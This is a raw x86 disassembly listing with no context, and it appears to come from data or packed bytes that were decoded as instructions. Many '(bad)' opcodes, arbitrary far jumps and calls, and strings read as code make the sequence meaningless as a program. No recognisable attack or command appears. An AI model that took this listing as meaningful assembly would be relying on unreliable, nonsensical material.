  4230bc:	xchg   ecx,eax
  4230bd:	int3   
  4230be:	and    ebx,0xb5bc5658
  4230c4:	test   DWORD PTR ds:0x8e0c5ad8,0x66aa1dcd
  4230ce:	add    BYTE PTR [eax],al
  4230d0:	add    BYTE PTR [eax],al
  4230d2:	or     bh,dh
  4230d4:	ja     0x423120
  4230d6:	dec    edx
  4230d8:	cmp    eax,0x2e8eedf7
  4230dd:	dec    eax
  4230de:	inc    ecx
  4230df:	dec    esi
  4230e0:	adc    eax,0x1d67327
  4230e5:	add    BYTE PTR [eax+eax*1+0x0],ah
  4230e9:	add    BYTE PTR [esi-0x37adc527],ch
  4230ef:	inc    esi
  4230f0:	das    
  4230f1:	mov    edi,0x3d381115
  4230f6:	jnp    0x4230e8
  4230f8:	cwde   
  4230f9:	pop    edx
  4230fa:	push   0xa99ab1bd
  4230ff:	jo     0x4230ff
  423101:	addr16 repz fnclex 
  423105:	cmp    al,0x78
  423107:	shl    DWORD PTR [esi+ecx*1-0x3c],cl
  42310b:	dec    esi
  42310c:	sub    al,0xd0
  42310e:	je     0x42311a
  423110:	mov    ch,0xdc
  423112:	data16 jnp 0x423166
  423115:	arpl   WORD PTR [edx],bx
  423117:	cmp    ecx,DWORD PTR gs:[edx+0x54]
  42311b:	mov    edi,0x8712f24d
  423120:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423121:	cs stc 
  423123:	in     eax,dx
  423124:	or     esp,DWORD PTR [ebx+0x45]
  423127:	nop
  423128:	mov    ecx,0xeff82d92
  42312d:	mov    cl,0x94
  42312f:	ds aam 0x7d
  423132:	pop    es
  423133:	fnsave [edx-0x74]
  423136:	inc    ecx
  423137:	adc    al,0xaf
  423139:	mov    cl,0x32
  42313b:	call   0xa85918d0
  423140:	cmp    DWORD PTR [eax],0x49e2a77d
  423146:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423147:	mov    ch,0xde
  423149:	xchg   ebx,eax
  42314a:	test   al,0x84
  42314c:	xchg   ch,ah
  42314e:	add    BYTE PTR [eax],al
  423150:	add    BYTE PTR [eax],al
  423152:	arpl   WORD PTR ss:[eax-0x10],bp
  423156:	jge    0x423153
  423158:	mov    esi,0x8c7853e7
  42315d:	daa    
  42315e:	xor    bl,ah
  423160:	ins    BYTE PTR es:[di],dx
  423162:	xlat   BYTE PTR ds:[ebx]
  423163:	(bad)  
  423164:	add    DWORD PTR [eax],eax
  423166:	add    BYTE PTR fs:[eax],al
  423169:	add    cl,ch
  42316b:	cmp    al,0x72
  42316d:	(bad)  
  42316f:	cmp    ch,BYTE PTR [esi]
  423171:	jmp    0x3d14:0x9be269a5
  423178:	jae    0x423118
  42317a:	call   0xd4ec:0xf481c599
  423181:	mov    ebp,0x93d795ed
  423186:	sbb    DWORD PTR [edi+0x544373b2],ebx
  42318c:	jno    0x4231dc
  42318e:	fdivr  DWORD PTR [ecx+0x59]
  423191:	push   ds
  423192:	adc    DWORD PTR [edx-0x5],esi
  423195:	sub    al,0x9b
  423197:	mov    bh,0xdd
  423199:	mov    dh,0xf9
  42319b:	js     0x4231da
  42319d:	sbb    DWORD PTR [eax-0x25],0x19384eb8
  4231a4:	cmp    ch,cl
  4231a6:	sahf   
  4231a7:	and    ch,dl
  4231a9:	ror    BYTE PTR [esi-0x69a4ccd8],cl
  4231af:	inc    edx
  4231b0:	xchg   esp,eax
  4231b1:	test   BYTE PTR [edx-0x702cf10c],ch
  4231b7:	lods   al,BYTE PTR ds:[esi]
  4231b8:	jle    0x42316f
  4231ba:	lods   eax,DWORD PTR ds:[esi]
  4231bb:	add    BYTE PTR [eax],bh
  4231bd:	mov    ch,0xf5
  4231bf:	add    esp,esi
  4231c1:	aad    0x80
  4231c3:	jmp    DWORD PTR [esi-0x6126068]
  4231c9:	imul   edi,DWORD PTR [edi-0x39],0xffffffd4
  4231cd:	jl     0x4231cf
  4231cf:	add    BYTE PTR [eax],al
  4231d1:	add    BYTE PTR [edi],ah
  4231d3:	push   ecx
  4231d4:	imul   esi,DWORD PTR [ecx-0x28004681],0x8274b3d8
  4231de:	imul   esi,DWORD PTR [ecx-0x21bc9747],0x640001
  4231e8:	add    BYTE PTR [eax],al
  4231ea:	fnstsw WORD PTR [edx+0x67]
  4231ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4231ee:	mov    edx,0x235be0e2
  4231f3:	sbb    al,0x50
  4231f5:	ret    
  4231f6:	cdq    
  4231f7:	or     al,0xdb
  4231f9:	sbb    eax,0xff03c67c
  4231fe:	mov    ch,0x6c
  423200:	or     bh,BYTE PTR [edx-0x6be0d99d]
  423206:	fimul  DWORD PTR [eax+0x4d06295f]
  42320c:	push   esi
  42320d:	push   ebp
  42320e:	daa    
  42320f:	es lock (bad) 
  423212:	aad    0xea
  423214:	lahf   
  423215:	popf   
  423216:	shl    DWORD PTR [ecx-0x44b0fa47],1
  42321c:	add    BYTE PTR [edi+0x5497db2f],ch
  423222:	hlt    
  423223:	in     eax,0xbd
  423225:	mov    ecx,0xfc795cb4
  42322a:	fdiv   QWORD PTR [ecx]
  42322c:	ret    0xe90
  42322f:	ret    
  423230:	jo     0x423261
  423232:	xor    BYTE PTR [edi-0x7d],al
  423235:	push   ecx
  423236:	mov    DWORD PTR [ebp+0x5f],0xde5ea2aa
  42323d:	sbb    DWORD PTR [ebx],edx
  42323f:	push   ebx
  423240:	mov    es,WORD PTR [eax+0x34]
  423243:	push   ss
  423244:	push   ebp
  423245:	(bad)  
  423247:	aad    0x33
  423249:	sbb    al,0xc
  42324b:	je     0x423256
  42324d:	fild   WORD PTR [eax]
  42324f:	add    BYTE PTR [eax],al
  423251:	add    BYTE PTR [edi],ah
  423253:	ss lahf 
  423255:	xor    DWORD PTR [edi+0x1536afb9],ebx
  42325b:	and    eax,0xf78075b
  423260:	out    0x51,al
  423262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423263:	fiadd  WORD PTR [ecx]
  423265:	add    BYTE PTR [eax+eax*1+0x0],ah
  423269:	add    BYTE PTR [esi+0x6e9d882a],al
  42326f:	xchg   edi,eax
  423270:	cdq    
  423271:	mov    DWORD PTR [ecx-0x385462c],0x778da75d
  42327b:	enter  0xbcc8,0xff
  42327f:	cld    
  423280:	sbb    al,BYTE PTR [ebx-0x1e]
  423283:	mov    edx,0x2ce181
  423288:	sub    eax,0x2d97f651
  42328d:	cmp    BYTE PTR [ecx-0x515ec0b3],cl
  423293:	mov    ecx,0xd863d1e7
  423298:	adc    al,0x60
  42329a:	mov    esi,0xc8c6a6b2
  42329f:	int3   
  4232a0:	and    ebp,ecx
  4232a2:	pop    es
  4232a3:	inc    esi
  4232a4:	cmp    eax,0x7cd82f16
  4232a9:	popa   
  4232aa:	and    DWORD PTR [ecx+0x65],0xffffff8d
  4232ae:	in     al,0x4b
  4232b0:	pop    ebp
  4232b1:	xchg   ebp,eax
  4232b2:	adc    eax,0x15b971b4
  4232b7:	int3   
  4232b8:	adc    bh,BYTE PTR [eax]
  4232ba:	add    eax,0x953ceb31
  4232bf:	pop    edi
  4232c0:	and    al,0xb9
  4232c2:	popa   
  4232c3:	aaa    
  4232c4:	mov    ebx,0x12ecdc99
  4232c9:	dec    eax
  4232ca:	xchg   edi,eax
  4232cb:	or     dh,dl
  4232cd:	rol    BYTE PTR [eax],1
  4232cf:	add    BYTE PTR [eax],al
  4232d1:	add    BYTE PTR [edi],dh
  4232d3:	(bad)  
  4232d4:	out    0xc2,eax
  4232d6:	mul    ebx
  4232d8:	aaa    
  4232d9:	cmc    
  4232da:	xchg   ecx,eax
  4232db:	call   0x6362:0x81bbeef4
  4232e2:	or     ebx,edi
  4232e4:	add    DWORD PTR [eax],eax
  4232e6:	add    BYTE PTR fs:[eax],al
  4232e9:	add    BYTE PTR [edx],bl
  4232eb:	fisttp WORD PTR [esi-0x220d6e80]
  4232f1:	push   ss
  4232f2:	or     DWORD PTR [ebx],edx
  4232f4:	(bad)
  4232f7:	mov    dh,0xe1
  4232f9:	mov    eax,0x1beb4511
  4232fe:	pushf  
  4232ff:	push   eax
  423300:	arpl   WORD PTR [edx-0x5c],ax
  423303:	inc    edx
  423304:	mov    ds:0x14d3ddfd,al
  423309:	lea    edi,[eax-0x2ec88a5d]
  42330f:	jl     0x423358
  423311:	adc    BYTE PTR [ebp+0x69],bh
  423314:	sti    
  423315:	jnp    0x423305
  423317:	cmc    
  423318:	jns    0x423352
  42331a:	scas   eax,DWORD PTR es:[edi]
  42331b:	push   ebp
  42331c:	mov    edx,0x9e96fb18
  423321:	call   0xbed3:0x3c9bbaad
  423328:	les    esi,FWORD PTR [esi+0x182696a7]
  42332e:	pavgw  mm3,QWORD PTR [eax]
  423331:	push   0xffffffee
  423333:	dec    ecx
  423334:	add    eax,0x60119ee7
  423339:	outs   dx,DWORD PTR ds:[esi]
  42333a:	or     DWORD PTR [ecx],ecx
  42333c:	loope  0x42339f
  42333e:	js     0x4232d1
  423340:	loop   0x4232e6
  423342:	add    ah,BYTE PTR [ebx]
  423344:	in     eax,dx
  423345:	aam    0x7d
  423347:	push   ds
  423348:	retf   0xc52c
  42334b:	or     edi,DWORD PTR [edx+0x36]
  423351:	add    BYTE PTR [esi],dl
  423353:	aad    0xdf
  423355:	out    dx,eax
  423356:	fucomip st,st(7)
  423358:	ss std 
  42335a:	cmp    BYTE PTR [esi-0x2b92a0c6],al
  423360:	or     al,0xa4
  423362:	outs   dx,DWORD PTR ds:[esi]
  423363:	fild   WORD PTR [ecx]
  423365:	add    BYTE PTR [eax+eax*1+0x0],ah
  423369:	add    BYTE PTR [edx+0x27d9d795],bh
  42336f:	out    0x1e,eax
  423371:	fs call 0x14cd65ed
  423377:	jge    0x423391
  423379:	arpl   WORD PTR [ecx+eax*1-0x3aa1ac76],si
  423380:	mov    bh,0x36
  423382:	outs   dx,BYTE PTR ds:[esi]
  423383:	daa    
  423384:	mov    esp,0x9e00adf2
  423389:	add    BYTE PTR [edi],cl
  42338b:	pushf  
  42338c:	or     ah,dl
  42338e:	xchg   esi,eax
  42338f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423390:	xor    BYTE PTR [edi],dh
  423392:	lahf   
  423393:	jae    0x423336
  423395:	mov    dh,0xe9
  423397:	cli    
  423398:	cmp    eax,0x14d4d9f3
  42339d:	cmp    al,0xc2
  42339f:	push   edi
  4233a0:	push   cs
  4233a1:	bound  edi,QWORD PTR [ebx]
  4233a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4233a4:	dec    esi
  4233a5:	inc    edi
  4233a6:	rol    DWORD PTR [ebx-0x21],cl
  4233a9:	hlt    
  4233aa:	lods   eax,DWORD PTR ds:[esi]
  4233ab:	icebp  
  4233ac:	fmul   QWORD PTR [eax-0x637153a2]
  4233b2:	xchg   esi,eax
  4233b3:	nop
  4233b4:	je     0x423366
  4233b6:	ret    
  4233b7:	aam    0x26
  4233b9:	out    0xfb,eax
  4233bb:	ja     0x4233da
  4233bd:	jmp    0x2b6c:0xdccb2363
  4233c4:	cmp    ecx,DWORD PTR [eax+edi*2+0x3a6520bb]
  4233cb:	inc    edx
  4233cc:	fdivr  DWORD PTR [eax+0x0]
  4233cf:	add    BYTE PTR [eax],al
  4233d1:	add    BYTE PTR [esi+0x76],ch
  4233d4:	in     al,0xca
  4233d6:	cld    
  4233d7:	fisubr DWORD PTR [esi-0xa]
  4233da:	sbb    BYTE PTR [edx+0x71a89787],dl
  4233e0:	pop    es
  4233e1:	out    dx,eax
  4233e2:	rcr    edi,cl
  4233e4:	add    DWORD PTR [eax],eax
  4233e6:	add    BYTE PTR fs:[eax],al
  4233e9:	add    BYTE PTR [edx+0x3e],ah
  4233ec:	push   ebp
  4233ed:	or     edx,ebp
  4233ef:	jnp    0x423396
  4233f1:	push   ebx
  4233f2:	xor    al,0xfd
  4233f4:	xchg   edx,eax
  4233f5:	mov    eax,0x8c6dc026
  4233fa:	xlat   BYTE PTR ds:[ebx]
  4233fb:	aam    0x7b
  4233fd:	outs   dx,DWORD PTR ds:[esi]
  4233fe:	jmp    0x423412
  423400:	cdq    
  423401:	push   0xe39a815c
  423406:	pusha  
  423407:	xchg   ecx,eax
  423408:	mov    dh,0x95
  42340a:	push   cs
  42340b:	call   0x852f6afe
  423410:	push   0x70
  423412:	ja     0x4233ab
  423414:	shl    cl,1
  423416:	push   0x199040f1
  42341b:	test   BYTE PTR [eax+0x21],al
  42341e:	jnp    0x42347c
  423420:	dec    esp
  423421:	jmp    0x4233e6
  423423:	(bad)  
  423424:	gs mov esi,0x42735a66
  42342a:	leave  
  42342b:	(bad)  
  42342d:	nop
  42342e:	(bad)  
  42342f:	cwde   
  423430:	xchg   esi,eax
  423431:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423432:	hlt    
  423433:	inc    edi
  423434:	enter  0x9983,0x5b
  423438:	ja     0x4233d6
  42343a:	inc    ecx
  42343b:	mov    edi,0x16f493d8
  423440:	dec    esi
  423441:	xor    bl,al
  423443:	or     esp,DWORD PTR [edx-0x6851d370]
  423449:	dec    esi
  42344a:	xchg   DWORD PTR [ecx],ebp
  42344c:	jne    0x423426
  42344e:	add    BYTE PTR [eax],al
  423450:	add    BYTE PTR [eax],al
  423452:	cmp    dl,BYTE PTR [edx-0x3c]
  423455:	paddsb mm3,QWORD PTR [edi-0x2e098805]
  42345c:	nop
  42345d:	shl    DWORD PTR [eax+0x37077885],cl
  423463:	loopne 0x423466
  423465:	add    BYTE PTR [eax+eax*1+0x0],ah
  423469:	add    BYTE PTR [edx+0x4a],bl
  42346c:	pop    ebx
  42346d:	mov    BYTE PTR [eax+0xf6c4d02],bh
  423473:	xchg   ecx,eax
  423474:	dec    ecx
  423475:	sbb    esi,DWORD PTR [ebx]
  423477:	data16 aaa 
  423479:	and    BYTE PTR [edi+edx*8],al
  42347c:	sbb    BYTE PTR [eax],0x5e
  42347f:	fs and al,0x4e
  423482:	jl     0x423468
  423484:	ds push 0xfb55656b
  42348a:	or     DWORD PTR [ebx-0x5d],ebp
  42348d:	stc    
  42348e:	mov    ebp,DWORD PTR [eax]
  423490:	mov    ds:0x8c7df1e2,al
  423495:	ja     0x423453
  423497:	out    dx,al
  423498:	mov    ebx,DWORD PTR fs:[esi-0x6b]
  42349c:	push   ds
  42349d:	or     al,0x6
  42349f:	mov    esi,0xd387e5b4
  4234a4:	pusha  
  4234a5:	xchg   esi,eax
  4234a6:	inc    ebp
  4234a7:	adc    ah,BYTE PTR [ebp-0x43]
  4234aa:	jns    0x423465
  4234ac:	outs   dx,DWORD PTR ds:[esi]
  4234ad:	rol    dh,1
  4234af:	shr    ebp,cl
  4234b1:	jmp    0x6f113d43
  4234b6:	das    
  4234b7:	or     al,0x2a
  4234b9:	jmp    0x4234c7
  4234bb:	mul    DWORD PTR [ebp+0x23]
  4234be:	retf   0x23df
  4234c1:	pop    ds
  4234c2:	mul    BYTE PTR [ebx-0x2b4011fd]
  4234c8:	loop   0x4234f2
  4234ca:	or     bh,BYTE PTR [eax]
  4234cc:	mov    esi,0x85
  4234d1:	add    BYTE PTR [ebx-0x4293427d],dl
  4234d7:	jle    0x4234ac
  4234d9:	call   DWORD PTR [eax-0x20]
  4234dc:	cli    
  4234dd:	call   0xe09b:0x8cfda081
  4234e4:	add    DWORD PTR [eax],eax
  4234e6:	add    BYTE PTR fs:[eax],al
  4234e9:	add    BYTE PTR [ebx+eiz*1+0x7f],ch
  4234ed:	sub    DWORD PTR [ecx-0x733c5fe9],edi
  4234f3:	call   DWORD PTR [eax+edi*4-0x7a]
  4234f7:	bound  edi,QWORD PTR [esi-0x107cf4ed]
  4234fd:	jmp    0x8a591bbb
  423502:	jns    0x42357e
  423504:	inc    edx
  423505:	and    bl,BYTE PTR [esi]
  423507:	add    edi,DWORD PTR ds:0xb793709d
  42350d:	icebp  
  42350e:	xchg   DWORD PTR [eax+eiz*4-0xc],edi
  423512:	xor    esp,DWORD PTR [edx+edi*4]
  423515:	mov    edx,0xa2855634
  42351a:	inc    ecx
  42351b:	mov    ds:0x55b89b80,eax
  423520:	lods   eax,DWORD PTR ds:[esi]
  423521:	dec    eax
  423522:	lock in al,0x3e
  423525:	ja     0x4234e6
  423527:	sub    DWORD PTR [ebx],esi
  423529:	xor    al,0x2
  42352b:	xchg   ebp,eax
  42352c:	xor    DWORD PTR [edx+ecx*8],esp
  42352f:	popf   
  423530:	ds (bad) 
  423533:	mov    bl,0xc1
  423535:	mov    BYTE PTR [edi],al
  423537:	jne    0x42356e
  423539:	xchg   ecx,eax
  42353a:	repnz dec edi
  42353c:	test   DWORD PTR [ebp+eax*2-0x59782a18],esi
  423543:	xor    al,0x68
  423545:	pusha  
  423546:	or     BYTE PTR [ecx-0x5c],bl
  423549:	sti    
  42354a:	add    dl,BYTE PTR [edi+0x6f]
  42354d:	push   ecx
  42354e:	add    BYTE PTR [eax],al
  423550:	add    BYTE PTR [eax],al
  423552:	(bad)  
  423554:	test   eax,0xddffeef7
  42355a:	and    al,0x1
  42355c:	pop    ebp
  42355d:	dec    edi
  42355e:	inc    ebx
  42355f:	outs   dx,DWORD PTR ds:[esi]
  423560:	push   esi
  423561:	and    edi,edi
  423563:	loopne 0x423566
  423565:	add    BYTE PTR [eax+eax*1+0x0],ah
  423569:	add    BYTE PTR [eax-0x55],cl
  42356c:	fdiv   DWORD PTR [edx+0x38]
  42356f:	out    0x16,al
  423571:	out    dx,eax
  423572:	ja     0x4235e6
  423574:	ins    DWORD PTR es:[edi],dx
  423575:	gs pop ebp
  423577:	adc    DWORD PTR [esi+edx*2-0x2b0e68a],edx
  42357e:	into   
  42357f:	pop    ecx
  423580:	xor    bl,0x92
  423583:	fsubr  DWORD PTR [ebx+edx*2+0x5e]
  423587:	jecxz  0x4235ec
  423589:	xchg   edx,eax
  42358a:	sbb    cl,BYTE PTR [ebp+eiz*8-0x3f234004]
  423591:	in     eax,0x77
  423593:	cmp    eax,0xdcece415
  423598:	pop    esp
  423599:	popf   
  42359a:	sar    BYTE PTR [eax],cl
  42359c:	int    0x75
  42359e:	int3   
  42359f:	inc    esi
  4235a0:	xor    al,0xc0
  4235a2:	mov    al,ds:0x9eff9642
  4235a7:	push   ebp
  4235a8:	loop   0x4235ca
  4235aa:	test   eax,0xd62c8d3c
  4235af:	push   0x41dc239c
  4235b4:	mov    BYTE PTR [edx-0x1a],bh
  4235b7:	pushf  
  4235b8:	(bad)  
  4235b9:	mov    eax,0x865a18e2
  4235be:	je     0x4235a0
  4235c0:	push   ecx
  4235c1:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4235c3:	lahf   
  4235c4:	aaa    
  4235c5:	outs   dx,DWORD PTR es:[esi]
  4235c7:	xchg   edi,eax
  4235c8:	and    DWORD PTR [ecx-0x49],ecx
  4235cb:	das    
  4235cc:	push   0x70
  4235ce:	add    BYTE PTR [eax],al
  4235d0:	add    BYTE PTR [eax],al
  4235d2:	outs   dx,DWORD PTR ds:[esi]
  4235d3:	mov    ds:0x7edd2ad4,al
  4235d8:	jmp    edi
  4235da:	push   edx
  4235db:	fcmovu st,st(5)
  4235dd:	in     eax,0x31
  4235df:	sub    al,0xbc
  4235e1:	int3   
  4235e2:	arpl   cx,sp
  4235e4:	add    DWORD PTR [eax],eax
  4235e6:	add    BYTE PTR fs:[eax],al
  4235e9:	add    BYTE PTR [esi+0x6c],cl
  4235ec:	push   esi
  4235ed:	mov    cl,0x53
  4235ef:	in     eax,0x3f
  4235f1:	icebp  
  4235f2:	test   al,0xe1
  4235f4:	sub    bh,BYTE PTR [edi+0x1a]
  4235f7:	mov    dl,0xe1
  4235f9:	inc    edx
  4235fa:	faddp  st(1),st
  4235fc:	lods   eax,DWORD PTR ds:[esi]
  4235fd:	fisubr WORD PTR [ebp-0x721a799d]
  423603:	dec    edx
  423604:	xchg   ebp,eax
  423605:	idiv   cl
  423607:	call   0x9e1:0xb7c2dd39
  42360e:	jmp    0x4235a5
  423610:	or     eax,0xacc54886
  423615:	cs push 0xffffffcb
  423618:	repz pop eax
  42361a:	fcmovbe st,st(3)
  42361c:	fcom   QWORD PTR [eax+esi*8+0x4cd47dc5]
  423623:	mov    dh,0x3d
  423625:	push   ebx
  423626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423627:	xlat   BYTE PTR ds:[ebx]
  423628:	int3   
  423629:	retf   0x4ac1
  42362c:	add    al,BYTE PTR [ebx-0x62]
  42362f:	loope  0x42368e
  423631:	sbb    edi,edx
  423633:	mov    bl,0x3a
  423635:	inc    ebp
  423636:	sahf   
  423637:	fs pop edx
  423639:	mov    al,ds:0x16be6192
  42363e:	inc    eax
  42363f:	cmp    dh,BYTE PTR ds:0xa83d414e
  423645:	jno    0x4236b3
  423647:	loop   0x423636
  423649:	mov    dl,0x4d
  42364b:	mov    esp,0x6e47
  423650:	add    BYTE PTR [eax],al
  423652:	stc    
  423653:	sbb    al,al
  423655:	inc    esi
  423656:	jecxz  0x423636
  423658:	(bad)  
  423659:	mov    edi,0xe1f1bc83
  42365e:	jmp    0xc77bf318
  423663:	loope  0x423666
  423665:	add    BYTE PTR [eax+eax*1+0x0],ah
  423669:	add    BYTE PTR [edx+0x48],ah
  42366c:	out    0xd3,eax
  42366e:	dec    eax
  42366f:	jmp    0x49f4:0xebb86d39
  423676:	jns    0x42367c
  423678:	mov    cl,BYTE PTR [edi+0x233e7f6a]
  42367e:	xor    ecx,esp
  423680:	jbe    0x423689
  423682:	dec    esi
  423683:	fwait
  423684:	or     ecx,DWORD PTR ds:0xc754843a
  42368a:	jmp    0x66322133
  42368f:	mov    al,BYTE PTR [ecx+ecx*1]
  423692:	adc    esi,ecx
  423694:	hlt    
  423695:	(bad)  
  423697:	pop    edx
  423698:	and    cl,dh
  42369a:	push   cs
  42369b:	push   cs
  42369c:	pop    edi
  42369d:	and    bh,BYTE PTR [eax]
  42369f:	mov    al,0x14
  4236a1:	add    eax,0xc3b09866
  4236a6:	nop
  4236a7:	xor    al,0x6b
  4236a9:	and    DWORD PTR gs:[ebx],ebx
  4236ac:	gs nop
  4236ae:	icebp  
  4236af:	loop   0x4236c7
  4236b1:	add    bh,BYTE PTR gs:[edi+0x69827ad]
  4236b8:	pop    edx
  4236b9:	popa   
  4236ba:	inc    ebx
  4236bb:	pushf  
  4236bc:	iret   
  4236bd:	shl    bh,cl
  4236bf:	jge    0x4236c4
  4236c1:	push   0xffffff91
  4236c3:	push   ebp
  4236c4:	aaa    
  4236c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236c6:	mov    DWORD PTR [ecx+0x1a],eax
  4236c9:	(bad)  
  4236ca:	clc    
  4236cb:	xor    DWORD PTR [edi+0xaa],edx
  4236d1:	add    BYTE PTR [ecx+0x3e8336b9],ah
  4236d7:	(bad)  
  4236d8:	mov    ch,0xbb
  4236da:	icebp  
  4236db:	and    eax,0x54ba8c27
  4236e0:	lods   eax,DWORD PTR ds:[esi]
  4236e1:	and    ebp,DWORD PTR [ebx]
  4236e3:	loop   0x4236e6
  4236e5:	add    BYTE PTR [eax+eax*1+0x0],ah
  4236e9:	add    BYTE PTR [ecx],al
  4236eb:	inc    edi
  4236ec:	sbb    DWORD PTR [edi-0x25],edi
  4236ef:	mov    gs,WORD PTR [eax+0x8]
  4236f2:	pop    ds
  4236f3:	aad    0x56
  4236f5:	and    BYTE PTR [edi+0x57],0xe6
  4236f9:	fwait
  4236fa:	xor    DWORD PTR [ecx+eax*8-0x7a04396a],esp
  423701:	cmp    edx,DWORD PTR [eax-0x4e]
  423704:	sbb    DWORD PTR [edi-0x5913acee],0x67a90203
  42370e:	jg     0x4236b9
  423710:	pushf  
  423711:	sub    BYTE PTR [edx-0x6a8ede2d],ch
  423717:	mov    ch,0x4b
  423719:	and    bh,BYTE PTR [esi]
  42371b:	loopne 0x4236c5
  42371d:	mov    edx,0x9ab2d0a5
  423722:	jmp    0x4236c6
  423724:	adc    edx,DWORD PTR [ecx]
  423726:	mov    al,ds:0x7df01c02
  42372b:	inc    edx
  42372c:	mov    eax,ds:0x5f3409f5
  423731:	xchg   BYTE PTR [ecx],ah
  423733:	fidivr WORD PTR [ecx]
  423735:	pop    edx
  423736:	jmp    0x7c87c07a
  42373b:	add    al,0x72
  42373d:	loop   0x423796
  42373f:	pop    ecx
  423740:	inc    ecx
  423741:	sti    
  423742:	mov    al,gs:0xb6bebcf1
  423748:	and    dh,0x98
  42374b:	lods   al,BYTE PTR ds:[esi]
  42374c:	mov    ebx,0xca
  423751:	add    BYTE PTR [edx],dl
  423753:	xlat   BYTE PTR ds:[ebx]
  423754:	repz or esi,edi
  423757:	das    
  423758:	cli    
  423759:	fist   WORD PTR [ecx]
  42375b:	dec    ebx
  42375c:	es nop
  42375e:	ins    BYTE PTR es:[edi],dx
  42375f:	sti    
  423760:	sub    ch,BYTE PTR [edi+0x1e28f]
  423766:	add    BYTE PTR fs:[eax],al
  423769:	add    al,dh
  42376b:	push   ebx
  42376c:	lock sbb dl,dl
  42376f:	sahf   
  423770:	jb     0x4236fb
  423772:	pusha  
  423773:	inc    edx
  423774:	in     eax,dx
  423775:	sub    bl,BYTE PTR [ecx+eiz*2+0x611d397d]
  42377c:	lahf   
  42377d:	xchg   BYTE PTR [edi+esi*2-0x7b],bh
  423781:	mov    ebx,0xbefaa62c
  423786:	and    al,0xf2
  423788:	jge    0x4237d1
  42378a:	test   ch,dh
  42378c:	push   esi
  42378d:	fwait
  42378e:	ror    DWORD PTR [edx+0x63e3d5de],1
  423794:	xchg   ecx,eax
  423795:	outs   dx,DWORD PTR ds:[esi]
  423796:	cli    
  423797:	push   esi
  423798:	xor    al,0xf9
  42379a:	in     al,0x57
  42379c:	mov    ebx,0xb3b97849
  4237a1:	cmp    esp,DWORD PTR [ecx-0x24]
  4237a4:	sti    
  4237a5:	jbe    0x423823
  4237a7:	mov    al,ds:0x35fee1ae
  4237ac:	neg    cl
  4237ae:	and    DWORD PTR [esi+ebx*4],esp
  4237b1:	xor    DWORD PTR ds:0x4e089e3b,esp
  4237b7:	shl    al,cl
  4237b9:	fnstcw WORD PTR [ecx-0x40b7e729]
  4237bf:	push   ds
  4237c0:	inc    DWORD PTR [edx+esi*2+0x13017749]
  4237c7:	pop    ss
  4237c8:	cdq    
  4237c9:	enter  0x77db,0xd3
  4237cd:	mov    al,BYTE PTR [eax]
  4237cf:	add    BYTE PTR [eax],al
  4237d1:	add    BYTE PTR [eax],al
  4237d3:	rol    BYTE PTR [edx+0x0],0x4
  4237d7:	rol    BYTE PTR [edx+0x0],0x8
  4237db:	rol    BYTE PTR [edx+0x0],0xc
  4237df:	rol    BYTE PTR [edx+0x0],0x10
  4237e3:	rol    BYTE PTR [edx+0x0],0x14
  4237e7:	rol    BYTE PTR [edx+0x0],0x18
  4237eb:	rol    BYTE PTR [edx+0x0],0x1c
  4237ef:	rol    BYTE PTR [edx+0x0],0x57
  4237f3:	inc    edi
  4237f4:	cmp    DWORD PTR [edi+0x41],ebx
  4237f7:	pop    eax
  4237f8:	ss push esi
  4237fa:	pop    edi
  4237fb:	cmp    BYTE PTR [eax],al
  4237fd:	inc    ebx
  4237fe:	inc    ebp
  4237ff:	dec    esp
  423800:	pop    edi
  423801:	pop    eax
  423802:	push   edi
  423803:	dec    eax
  423804:	inc    edx
  423805:	add    BYTE PTR [edi+0x50],dl
  423808:	xor    eax,0x4641365f
  42380d:	cmp    DWORD PTR [edx],esi
  42380f:	xor    ebx,DWORD PTR [edi+0x32]
  423812:	aaa    
  423813:	add    BYTE PTR [eax+0x48],dl
  423816:	xor    BYTE PTR [edi+0x58],bl
  423819:	push   esp
  42381a:	inc    ecx
  42381b:	dec    ebp
  42381c:	push   ecx
  42381d:	pop    edi
  42381e:	inc    esi
  42381f:	push   ebp
  423820:	cmp    DWORD PTR [eax],eax
  423822:	push   edi
  423823:	push   ebp
  423824:	inc    ecx
  423825:	xor    dh,BYTE PTR [ebx]
  423827:	xor    ebx,DWORD PTR [edi+0x4e]
  42382a:	add    BYTE PTR [esp+ecx*2+0x4d],dl
  42382e:	cmp    DWORD PTR [edi+0x38],ebx
  423831:	dec    ecx
  423832:	cmp    DWORD PTR [edx+0x36],ebx
  423835:	pop    edi
  423836:	dec    edx
  423837:	xor    BYTE PTR [edx+0x34],cl
  42383a:	add    BYTE PTR [ecx+eax*2+0x34],cl
  42383e:	xor    esi,DWORD PTR [eax]
  423840:	pop    edi
  423841:	inc    edx
  423842:	dec    ebx
  423843:	pop    eax
  423844:	pop    eax
  423845:	xor    eax,0x51414d00
  42384a:	pop    edi
  42384b:	inc    ecx
  42384c:	xor    al,BYTE PTR [ebp+0x5f]
  42384f:	inc    ecx
  423850:	dec    ebx
  423851:	cmp    DWORD PTR ds:0x5a003939,esi
  423857:	inc    ebp
  423858:	cmp    BYTE PTR [edi+0x4d],bl
  42385b:	ss dec eax
  42385d:	dec    ebx
  42385e:	add    BYTE PTR [ebp+0x57],al
  423861:	xor    DWORD PTR [edi+0x31],ebx
  423864:	dec    ebx
  423865:	xor    eax,DWORD PTR [ecx+0x30]
  423868:	push   ebx
  423869:	add    BYTE PTR [edx+esi*1+0x36],al
  42386d:	aaa    
  42386e:	pop    edi
  42386f:	push   edx
  423870:	dec    eax
  423871:	dec    ebp
  423872:	cmp    BYTE PTR [edi+0x37],bl
  423875:	inc    esi
  423876:	xor    eax,0x43355500
  42387b:	pop    edi
  42387c:	pop    ecx
  42387d:	dec    ecx
  42387e:	push   ebx
  42387f:	xor    bl,BYTE PTR [edi+0x52]
  423882:	add    BYTE PTR [eax+0x55],dl
  423885:	dec    ecx
  423886:	xor    BYTE PTR [edi+0x43],bl
  423889:	ss inc ebp
